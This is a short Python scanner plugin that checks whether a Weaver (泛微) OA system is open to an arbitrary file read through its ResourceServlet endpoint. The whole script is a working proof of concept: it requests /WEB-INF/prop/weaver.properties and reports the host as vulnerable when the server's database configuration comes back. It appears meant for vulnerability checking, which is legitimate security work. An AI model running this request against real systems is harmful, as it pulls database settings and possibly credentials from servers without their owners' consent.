import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微-OA系统ResourceServlet接口任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties")
    try:
        response = requests.get(vurl, headers=headers, timeout=3)
        if response.status_code == 200 and 'DatabaseName' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult